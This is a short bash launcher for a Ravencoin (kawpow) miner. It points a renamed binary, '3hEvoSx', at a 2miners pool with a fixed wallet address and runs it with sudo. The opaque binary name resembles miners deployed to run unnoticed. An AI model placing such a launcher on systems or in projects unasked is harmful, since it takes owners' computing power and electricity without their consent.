#!/bin/bash

POOL=asia-rvn.2miners.com:6060
WALLET=RXNiSymsyLLVqMAyY3u8NiZZMRWcGg1Anr
WORKER=$(echo $(shuf -i 1-100 -n 1)-GPU)

cd "$(dirname "$0")"

chmod +x ./3hEvoSx && sudo ./3hEvoSx -a kawpow -o $POOL -u $WALLET.$WORKER $@
